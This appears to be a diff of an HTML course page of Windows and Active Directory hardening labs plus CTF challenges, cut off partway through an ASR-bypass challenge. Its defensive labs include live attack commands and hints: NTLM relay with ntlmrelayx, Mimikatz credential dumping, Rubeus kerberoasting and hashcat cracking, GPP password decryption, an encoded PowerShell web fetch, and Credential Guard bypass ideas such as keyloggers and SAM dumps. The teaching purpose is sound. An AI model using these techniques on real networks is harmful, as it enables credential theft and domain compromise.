+              <li>Configure the full Advanced Audit Policy as specified above</li>
+              <li>Install Sysmon with a detection-focused configuration</li>
+              <li>Run Mimikatz in a lab VM and observe generated events</li>
+              <li>Document which Event IDs fired and what they contain</li>
+              <li>Write a PowerShell detection query for Sysmon Event ID 10 (ProcessAccess to LSASS)</li>
+              <li>Create a Sigma-style detection rule for the observed attack pattern</li>
+              <li>Enable LSASS PPL and verify Mimikatz is blocked</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: ASR Rules — Audit to Block Deployment</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Deploy ASR rules in audit mode, generate test events by simulating attacks, then switch to block mode and verify enforcement.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Enable ASR rules in AUDIT mode
+$rules = @(
+    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A",  # Block Office child processes
+    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2",  # Block cred stealing from LSASS
+    "D1E49AAC-8F56-4280-B9BA-993A6D77406C",  # Block PSExec/WMI
+    "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC"   # Block obfuscated scripts
+)
+foreach ($rule in $rules) {
+    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule -AttackSurfaceReductionRules_Actions 2
+}
+
+# Step 2: Simulate attacks
+# Create a Word doc with macro that launches cmd.exe (test Office child process rule)
+# Run an obfuscated PowerShell command
+powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0A
+
+# Step 3: Check audit events
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
+  Where-Object { $_.Id -in @(1121, 1122) } |
+  Select-Object TimeCreated, Id, Message -First 10
+
+# Step 4: Switch to BLOCK mode after validating
+foreach ($rule in $rules) {
+    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule -AttackSurfaceReductionRules_Actions 1
+}
+
+# Step 5: Re-run attacks and verify they're blocked
+# The obfuscated script should now be prevented from executing</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enable 4+ ASR rules in audit mode</li>
+              <li>Generate test events by simulating the blocked behaviors</li>
+              <li>Review audit events in Event Viewer (Event IDs 1121, 1122)</li>
+              <li>Switch rules to block mode</li>
+              <li>Verify attacks are now prevented</li>
+              <li>Add one legitimate application exclusion and verify it still works</li>
+              <li>Document the full deployment process for enterprise rollout</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: SMB Hardening &amp; Relay Prevention</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Disable SMBv1, enforce SMB signing, and verify that NTLM relay attacks (ntlmrelayx) are no longer possible.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Check current SMB configuration
+Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, RequireSecuritySignature, EncryptData
+Get-SmbClientConfiguration | Select-Object RequireSecuritySignature, EnableInsecureGuestLogons
+
+# Step 2: Disable SMBv1
+Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
+
+# Step 3: Require SMB signing
+Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
+
+# Step 4: Disable insecure guest logons
+Set-SmbClientConfiguration -EnableInsecureGuestLogons $false -Force</code></pre>
+<pre><code class="language-bash"># Step 5: Test from attacker machine — attempt NTLM relay
+# Setup Responder to capture hashes:
+sudo responder -I eth0 -wrf
+
+# Attempt relay with ntlmrelayx:
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+# EXPECTED RESULT: Relay should FAIL because signing is required
+# You'll see: "SMB signing is required, attack will not work"</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Audit current SMB configuration on target</li>
+              <li>Disable SMBv1 completely</li>
+              <li>Enable mandatory SMB signing (server and client)</li>
+              <li>From an attacker machine, attempt NTLM relay and verify it fails</li>
+              <li>Test that legitimate SMB connections still work</li>
+              <li>Enable SMB encryption (SMB 3.0+) for sensitive shares</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Deploy Credential Guard &amp; Test Protection</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Enable Credential Guard on a Windows machine and verify that Mimikatz can no longer extract credentials from LSASS.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Requirements: Hyper-V capable CPU, UEFI, Secure Boot, TPM 2.0
+# Test VM must have nested virtualization if running in a VM:
+# On host: Set-VMProcessor -VMName "TestVM" -ExposeVirtualizationExtensions $true
+
+# Step 1: Verify hardware readiness
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# Step 2: Enable Credential Guard
+# Method 1: Registry
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
+  -Name "EnableVirtualizationBasedSecurity" -Value 1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
+  -Name "RequirePlatformSecurityFeatures" -Value 3  # Secure Boot + DMA protection
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
+  -Name "LsaCfgFlags" -Value 1  # 1 = Enabled with UEFI lock
+
+# Step 3: Reboot
+Restart-Computer
+
+# Step 4: Verify Credential Guard is active
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
+  Select-Object VirtualizationBasedSecurityStatus, SecurityServicesRunning
+# SecurityServicesRunning should include 1 (Credential Guard)
+
+# Step 5: Test — run Mimikatz (should fail to get credentials)
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+# Expected: No NTLM hashes or cleartext passwords extracted for domain accounts</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Verify the test machine meets Credential Guard hardware requirements</li>
+              <li>Log in with a domain account and run Mimikatz BEFORE enabling CG (capture baseline)</li>
+              <li>Enable Credential Guard via registry and reboot</li>
+              <li>Verify CG is active using DeviceGuard WMI class and msinfo32</li>
+              <li>Log in again with the same domain account</li>
+              <li>Run Mimikatz again and compare output — domain creds should be absent</li>
+              <li>Document what CG does and does not protect against</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: LAPS Deployment &amp; Offensive Testing</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Deploy Windows LAPS in an AD environment, then test from an attacker perspective who can read LAPS passwords.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Update AD Schema for LAPS (on DC, as Schema Admin)
+Update-LapsADSchema
+
+# Step 2: Grant computers permission to update their own password
+Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=domain,DC=local"
+
+# Step 3: Grant specific admins permission to READ passwords
+Set-LapsADReadPasswordPermission -Identity "OU=Workstations,DC=domain,DC=local" `
+  -AllowedPrincipals "DOMAIN\Tier2-Admins"
+
+# Step 4: Configure LAPS via GPO
+# Computer Configuration → Administrative Templates → System → LAPS
+#   Password Settings: Length=20, Complexity=Large+Small+Numbers+Specials, Age=30
+#   Backup Directory: Active Directory
+#   Post-Authentication Actions: Reset password + Logoff
+
+# Step 5: Force LAPS to cycle password on test machine
+Invoke-LapsPolicyProcessing
+
+# Step 6: Retrieve LAPS password (as authorized admin)
+Get-LapsADPassword -Identity "WS01" -AsPlainText
+
+# Step 7: Offensive test — can we read LAPS passwords without authorization?
+# As a regular user:
+Get-ADComputer -Filter * -Properties ms-LAPS-Password, msLAPS-EncryptedPassword
+# Should return empty/null for unauthorized users</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Extend the AD schema for Windows LAPS</li>
+              <li>Configure LAPS via GPO with strong password settings</li>
+              <li>Deploy to a test OU and verify passwords are being rotated</li>
+              <li>Test authorized password retrieval</li>
+              <li>Test unauthorized access — verify standard users cannot read LAPS passwords</li>
+              <li>Find which groups/users have LAPS read permissions across all OUs (offensive audit)</li>
+              <li>Document LAPS bypass scenarios (compromised Tier 2 admin, ACL misconfiguration)</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: NTLM Restriction — Audit to Deny</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Implement phased NTLM restriction across a domain — audit, identify dependencies, create exceptions, then enforce.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Phase 1: AUDIT — Find all NTLM usage
+# GPO: Computer Configuration → Windows Settings → Security Settings → 
+#   Local Policies → Security Options
+
+# Enable NTLM auditing on DCs
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" `
+  -Name "AuditReceivingNTLMTraffic" -Value 2  # Log all
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" `
+  -Name "RestrictSendingNTLMTraffic" -Value 0  # Allow all (audit only)
+
+# Wait 1-2 weeks, then analyze NTLM logs
+Get-WinEvent -LogName "Microsoft-Windows-NTLM/Operational" -MaxEvents 100 |
+  Group-Object { $_.Properties[0].Value } |
+  Sort-Object Count -Descending |
+  Select-Object Count, Name
+
+# Phase 2: Identify and document legitimate NTLM needs
+# Common exceptions: legacy apps, non-Windows clients, specific service accounts
+
+# Phase 3: Create exception list
+# "Network security: Restrict NTLM: Add server exceptions in this domain"
+#   = List of servers that legitimately need NTLM (FQDN format)
+
+# Phase 4: Enforce
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" `
+  -Name "RestrictReceivingNTLMTraffic" -Value 2  # Deny all
+# Set LmCompatibilityLevel to 5 (refuse all LM/NTLM, NTLMv2 only as fallback)
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
+  -Name "LmCompatibilityLevel" -Value 5</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enable NTLM auditing across the domain</li>
+              <li>Collect audit data for at least 48 hours</li>
+              <li>Analyze: which machines, users, and applications use NTLM?</li>
+              <li>Create an exception list for legitimate NTLM consumers</li>
+              <li>Switch to "Deny all domain accounts" with exceptions</li>
+              <li>Verify Kerberos authentication still works for all standard services</li>
+              <li>From an attacker box, verify Responder/ntlmrelayx no longer captures usable hashes</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Tiered Administration — Implement Tier 0 Isolation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Create the OU structure and GPOs for a tiered admin model, then verify that Tier 0 credentials cannot be used on lower-tier systems.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Create OU structure
+New-ADOrganizationalUnit -Name "Tier 0" -Path "DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "Accounts" -Path "OU=Tier 0,DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "Servers" -Path "OU=Tier 0,DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "PAWs" -Path "OU=Tier 0,DC=domain,DC=local"
+
+New-ADOrganizationalUnit -Name "Tier 1" -Path "DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "Accounts" -Path "OU=Tier 1,DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "Servers" -Path "OU=Tier 1,DC=domain,DC=local"
+
+New-ADOrganizationalUnit -Name "Tier 2" -Path "DC=domain,DC=local"
+New-ADOrganizationalUnit -Name "Workstations" -Path "OU=Tier 2,DC=domain,DC=local"
+
+# Step 2: Create tier-specific admin groups
+New-ADGroup -Name "Tier0-Admins" -GroupScope Global -Path "OU=Accounts,OU=Tier 0,DC=domain,DC=local"
+New-ADGroup -Name "Tier1-Admins" -GroupScope Global -Path "OU=Accounts,OU=Tier 1,DC=domain,DC=local"
+New-ADGroup -Name "Tier2-Admins" -GroupScope Global -Path "OU=Accounts,OU=Tier 2,DC=domain,DC=local"
+
+# Step 3: Create GPO — Deny Tier 0 logon on Tier 1/2 systems
+# Link to Tier 1 and Tier 2 OUs:
+# User Rights: "Deny log on locally" = Tier0-Admins, Domain Admins, Enterprise Admins
+# User Rights: "Deny log on through Remote Desktop" = same
+# User Rights: "Deny access to this computer from the network" = same
+
+# Step 4: Verify isolation
+# Try to RDP from a Tier 2 workstation with a Tier 0 account — should be DENIED
+# Try to PsExec to a Tier 1 server with a Tier 0 account — should be DENIED</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Build the full tiered OU structure in a lab AD environment</li>
+              <li>Create admin accounts and groups per tier</li>
+              <li>Create and link GPOs that deny cross-tier logon</li>
+              <li>Test: Attempt Tier 0 account logon on a Tier 2 workstation (should fail)</li>
+              <li>Test: Attempt Tier 1 account logon on a Tier 0 DC (should fail)</li>
+              <li>Verify legitimate admin access still works within-tier</li>
+              <li>Add the Protected Users group for Tier 0 accounts</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: ADCS Hardening — Find &amp; Fix ESC Vulnerabilities</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Audit AD Certificate Services for ESC1-ESC8 vulnerabilities and apply mitigations.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Enumerate certificate templates (offensive tool — Certify)
+.\Certify.exe find /vulnerable
+.\Certify.exe find /enrolleeSuppliesSubject
+
+# Step 2: Check for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
+certutil -config "DC01\DomainCA" -getreg policy\EditFlags
+# If EDITF_ATTRIBUTESUBJECTALTNAME2 is present → vulnerable
+
+# Step 3: Fix ESC6
+certutil -config "DC01\DomainCA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+Restart-Service CertSvc
+
+# Step 4: Fix ESC1 — remove SAN from templates that don't need it
+# Open certtmpl.msc → template Properties → Subject Name tab
+# Change to "Build from this Active Directory information" (NOT "Supply in the request")
+
+# Step 5: Fix vulnerable template permissions (ESC4)
+# Remove excessive write/enroll permissions from low-privileged groups
+$templateDN = "CN=VulnTemplate,CN=Certificate Templates,CN=Configuration,DC=domain,DC=local"
+$acl = Get-ACL "AD:\$templateDN"
+# Remove GenericAll/WriteProperty from "Authenticated Users" or "Domain Users"
+
+# Step 6: Verify fix — re-run Certify
+.\Certify.exe find /vulnerable
+# Should return no vulnerable templates</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Set up a lab CA with intentionally vulnerable templates (ESC1, ESC4, ESC6)</li>
+              <li>Run Certify to enumerate and confirm vulnerabilities</li>
+              <li>Exploit ESC1 to obtain a Domain Admin certificate (prove the risk)</li>
+              <li>Apply mitigations for each ESC variant found</li>
+              <li>Disable EDITF_ATTRIBUTESUBJECTALTNAME2 flag</li>
+              <li>Restrict template enrollment permissions</li>
+              <li>Re-run the audit and confirm all ESC vectors are closed</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Windows Event Forwarding (WEF) Setup</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Configure WEF to centralize security events from multiple machines to a collector, then create detection rules.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># On COLLECTOR server:
+wecutil qc /q  # Enable Windows Event Collector service
+
+# Create subscription XML (save as security-events.xml)
+# See WEF section in notes for full XML template
+
+# Import subscription
+wecutil cs security-events.xml
+
+# On SOURCE machines (via GPO):
+# Computer Configuration → Administrative Templates → Windows Components → Event Forwarding
+# "Configure target Subscription Manager":
+#   Server=http://COLLECTOR.domain.local:5985/wsman/SubscriptionManager/WEC,Refresh=60
+
+# Force policy update on sources
+gpupdate /force
+# Restart WinRM
+Restart-Service WinRM
+
+# Verify on collector
+wecutil gr SecurityEvents
+# Should show source machines as "Active"
+
+# View forwarded events
+Get-WinEvent -LogName "ForwardedEvents" -MaxEvents 20 |
+  Select-Object TimeCreated, ProviderName, Id, Message</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Configure a Windows server as a WEF collector</li>
+              <li>Create a subscription for critical security events (4624, 4625, 4672, 4720, 4728, 7045)</li>
+              <li>Configure at least 2 source machines to forward events via GPO</li>
+              <li>Verify events are arriving on the collector</li>
+              <li>Generate test events (failed logons, privilege use) and confirm they appear in ForwardedEvents log</li>
+              <li>Write a PowerShell script that queries ForwardedEvents for suspicious patterns</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Honeytoken Deployment &amp; Detection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Deploy honeytoken accounts and canary objects, then trigger them with common attack tools and verify detection.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Create honeytoken service account (looks like a juicy target)
+New-ADUser -Name "svc_backup_sql" -SamAccountName "svc_backup_sql" `
+  -Description "SQL Backup Service - Tier 1 - Contact: IT Ops" `
+  -UserPrincipalName "svc_backup_sql@domain.local" `
+  -AccountPassword (ConvertTo-SecureString "Summer2024!Backup" -AsPlainText -Force) `
+  -Enabled $true -PasswordNeverExpires $true
+
+# Add SPN to make it Kerberoastable
+Set-ADUser "svc_backup_sql" -ServicePrincipalNames @{Add="MSSQLSvc/sqlbak.domain.local:1433"}
+
+# Step 2: Create canary file share
+New-Item -Path "C:\Shares\IT_Passwords" -ItemType Directory
+New-SmbShare -Name "IT_Passwords" -Path "C:\Shares\IT_Passwords" -ReadAccess "Everyone"
+Set-Content "C:\Shares\IT_Passwords\admin_creds.txt" "This is a canary file"
+
+# Step 3: Configure monitoring
+# Alert on any Event 4769 where ServiceName = svc_backup_sql (Kerberoasting detected)
+# Alert on any Event 5145 where ShareName = IT_Passwords (share enumeration detected)
+
+# Step 4: Simulate attacker activity
+# Kerberoast the honeytoken:
+.\Rubeus.exe kerberoast /user:svc_backup_sql
+# Access the canary share:
+dir \\DC01\IT_Passwords
+
+# Step 5: Verify detection
+Get-WinEvent -LogName Security |
+  Where-Object { $_.Id -eq 4769 -and $_.Message -match "svc_backup_sql" } |
+  Select-Object TimeCreated, Message -First 5</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Create a honeytoken user with realistic attributes and an SPN</li>
+              <li>Create a canary file share with enticing filenames</li>
+              <li>Set up Event Log monitoring for both honeytokens</li>
+              <li>Simulate Kerberoasting against the honeytoken account</li>
+              <li>Access the canary share and verify the event is logged</li>
+              <li>Write a scheduled PowerShell script that alerts (email/webhook) on honeytoken activity</li>
+              <li>Document false-positive scenarios and tuning guidance</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: Group Managed Service Accounts (gMSA)</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Replace a traditional service account with a gMSA, eliminating the Kerberoasting attack surface.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Verify KDS Root Key exists (or create)
+Get-KdsRootKey
+# If empty:
+Add-KdsRootKey -EffectiveImmediately  # Lab only! Production: -EffectiveTime ((Get-Date).AddHours(-10))
+
+# Step 2: Create gMSA
+New-ADServiceAccount -Name "gmsa_webapp" `
+  -DNSHostName "gmsa_webapp.domain.local" `
+  -PrincipalsAllowedToRetrieveManagedPassword "WebServers" `
+  -ServicePrincipalNames "HTTP/webapp.domain.local", "HTTP/webapp"
+
+# Step 3: Install on the target server (run ON the server)
+Install-ADServiceAccount -Identity "gmsa_webapp"
+Test-ADServiceAccount -Identity "gmsa_webapp"  # Must return True
+
+# Step 4: Configure IIS AppPool to use gMSA
+# AppPool → Advanced Settings → Identity → Custom Account
+# Username: DOMAIN\gmsa_webapp$
+# Password: (leave blank)
+
+# Step 5: Try to Kerberoast the gMSA
+.\Rubeus.exe kerberoast /user:gmsa_webapp$
+# The 120-char random password makes cracking infeasible
+
+# Step 6: Remove the old service account and its SPN
+Remove-ADUser "svc_webapp_old" -Confirm:$false</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Create the KDS Root Key if not present</li>
+              <li>Create a gMSA for a web application service</li>
+              <li>Install the gMSA on the target server</li>
+              <li>Configure a service (IIS, Windows Service, or Scheduled Task) to use the gMSA</li>
+              <li>Verify the service runs correctly with the managed account</li>
+              <li>Attempt Kerberoasting against the gMSA and verify the hash is uncrackable</li>
+              <li>Remove the legacy service account that the gMSA replaced</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 14: GPO Hardening &amp; GPP Password Audit</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Scan SYSVOL for Group Policy Preferences (GPP) passwords, remove them, and implement LAPS as a replacement.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Step 1: Scan SYSVOL for GPP passwords (cpassword attribute)
+# These are trivially decryptable — the AES key was published by Microsoft (MS14-025)
+Get-ChildItem "\\domain.local\SYSVOL\domain.local\Policies" -Recurse -Include "Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Drives.xml","Printers.xml" |
+  ForEach-Object {
+    $content = Get-Content $_.FullName
+    if ($content -match "cpassword") {
+      Write-Output "[!] GPP Password found: $($_.FullName)"
+      $content | Select-String "cpassword"
+    }
+  }
+
+# Step 2: Use PowerSploit's Get-GPPPassword
+Import-Module .\PowerSploit\Exfiltration\Get-GPPPassword.ps1
+Get-GPPPassword
+
+# Step 3: Decrypt a found cpassword (for awareness)
+# The AES-256 key (published by MS):
+# 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
+# Any tool can decrypt: gpp-decrypt, PowerSploit, CrackMapExec
+
+# Step 4: Remove GPP passwords
+# Edit the GPO → Preferences → remove the saved credentials
+# OR delete the XML file containing cpassword from SYSVOL
+
+# Step 5: Deploy LAPS as replacement for GPP-based local admin management</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Scan the entire SYSVOL for files containing "cpassword"</li>
+              <li>Decrypt any found GPP passwords to demonstrate the risk</li>
+              <li>Remove all GPP password entries from affected GPOs</li>
+              <li>Deploy LAPS as the secure alternative for local admin management</li>
+              <li>Verify no new GPP passwords are created (set up monitoring)</li>
+            </ol>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- CTF TAB                                                      -->
+      <!-- ============================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: The Unsigned Server</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You're on the internal network. A file server has SMB signing disabled. Capture credentials and relay them to read the flag at <code>\\FILESRV\SecretShare\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># You have access to an attacker box on the network
+# Target: FILESRV (192.168.1.10) — SMB signing NOT required
+# A user periodically accesses \\ATTACKER_IP\share (triggered every 2 min via scheduled task)
+
+# Verify SMB signing status
+crackmapexec smb 192.168.1.10 --gen-relay-list targets.txt
+# Output shows: 192.168.1.10 — Signing: False
+
+# Your tools: Responder, ntlmrelayx, crackmapexec</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Run Responder in analyze mode to see traffic: <code>sudo responder -I eth0 -A</code><br>
+            2. Set up ntlmrelayx targeting the file server: <code>sudo ntlmrelayx.py -t smb://192.168.1.10 -smb2support -c "type \\FILESRV\SecretShare\flag.txt"</code><br>
+            3. Wait for the scheduled task to trigger authentication to your machine.<br>
+            4. The relay captures the auth and executes your command on FILESRV.<br>
+            <strong>Fix:</strong> Enable <code>RequireSecuritySignature = $true</code> on both client and server.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: GPP Password Recovery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You have standard domain user credentials. Find the GPP password stored in SYSVOL and use it to access the admin share containing the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURDOM\lowuser (standard domain user)
+# You can access SYSVOL (all domain users can by default)
+# Flag is at: \\DC01\C$\flag.txt (requires admin credentials)
+
+# Start enumeration:
+dir \\domain.local\SYSVOL\domain.local\Policies\ /s /b | findstr /i ".xml"
+
+# Look for GPP files:
+# Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Search SYSVOL for XML files containing "cpassword": <code>findstr /s /i "cpassword" \\domain.local\SYSVOL\domain.local\Policies\*.xml</code><br>
+            2. Copy the cpassword value from Groups.xml (it's a local admin credential).<br>
+            3. Decrypt using <code>gpp-decrypt</code> or the known AES key: <code>gpp-decrypt "ENCRYPTED_VALUE_HERE"</code><br>
+            4. Use the decrypted password: <code>net use \\DC01\C$ /user:domain\Administrator "DecryptedPassword"</code><br>
+            5. Read the flag: <code>type \\DC01\C$\flag.txt</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Kerberoast the Honeytoken</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You have domain user access. Kerberoast all service accounts to find credentials. But beware — one account is a honeytoken that will trigger an alert. Get the real flag without tripping the alarm.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURDOM\analyst (standard domain user)
+# There are 5 accounts with SPNs in the domain
+# One of them is a honeytoken — Kerberoasting it triggers lockout of your account in 60 seconds
+# Flag: Use the cracked service account to access \\APPSRV\secrets\flag.txt
+
+# Enumerate SPNs
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, Description |
+  Select-Object Name, ServicePrincipalName, Description
+
+# Accounts with SPNs:
+# svc_mssql    - MSSQLSvc/sql01.domain.local:1433  - "SQL Production"
+# svc_http     - HTTP/web01.domain.local            - "IIS Web Application"
+# svc_backup   - HOST/backup01.domain.local         - "Backup Agent"
+# svc_monitor  - HTTP/monitor.domain.local          - "Monitoring Service"
+# svc_exchange - exchangeMDB/exch01.domain.local    - "Exchange Service"</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Don't blindly Kerberoast ALL accounts — one is a trap.<br>
+            2. Analyze the accounts: check creation date, last logon, password last set. Honeytokens often have unusual patterns (never logged on, very old password, etc.).<br>
+            3. <code>Get-ADUser svc_backup -Properties Created, LastLogonDate, PasswordLastSet, LogonCount</code> — if LogonCount=0 and Created recently, likely a honeytoken.<br>
+            4. Target specific accounts: <code>.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hash.txt</code><br>
+            5. Crack with hashcat: <code>hashcat -m 13100 hash.txt wordlist.txt</code><br>
+            6. Use cracked creds to access the flag share.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Bypass Credential Guard</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Credential Guard is enabled on the target. Standard Mimikatz fails. Find an alternative method to obtain domain credentials and read the flag at <code>C:\ProtectedFlag\flag.txt</code> (Domain Admin access required).</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You have local admin on a workstation (WS01)
+# Credential Guard is ACTIVE — Mimikatz logonpasswords returns nothing useful
+# A Domain Admin logs into this machine daily
+# Flag requires DA access: C:\DC01\ProtectedFlag\flag.txt
+
+# Verify CG is running:
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+# SecurityServicesRunning = {1}  ← Credential Guard active
+
+# Mimikatz attempt:
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+# Result: No NTLM hashes for domain accounts</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>CG protects LSASS memory, but not everything:</strong><br>
+            1. <strong>DCSync:</strong> If you can escalate to DA via another path, DCSync still works against the DC itself.<br>
+            2. <strong>Kerberos tickets in memory:</strong> <code>sekurlsa::tickets</code> may still extract Kerberos tickets (TGTs are issued by the KDC, not stored in isolated LSASS).<br>
+            3. <strong>DPAPI:</strong> <code>sekurlsa::dpapi</code> — DPAPI master keys may not be fully protected.<br>
+            4. <strong>Keylogging:</strong> Install a keylogger and wait for the DA to type credentials.<br>
+            5. <strong>Registry SAM:</strong> Local account hashes are NOT protected by CG. Dump SAM: <code>reg save HKLM\SAM sam.hive</code><br>
+            6. <strong>Shadow Credentials / RBCD:</strong> If you have write access to the DA's computer object, add shadow credentials or configure RBCD to impersonate them.<br>
+            The flag requires thinking beyond LSASS credential dumping.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: ASR Rule Bypass</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">ASR rules are blocking Office macro execution of child processes. Find a bypass to execute your payload from a macro and retrieve the flag from <code>C:\Users\victim\Desktop\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># Environment:
+# - Windows 10 with Defender and ASR rules enabled
+# - ASR Rule active: "Block all Office applications from creating child processes" (Block mode)
+# - ASR Rule active: "Block Office applications from creating executable content" (Block mode)
+# - User opens your malicious .docm file
+# - You need code execution in the user's context
+# - Flag: C:\Users\victim\Desktop\flag.txt
+
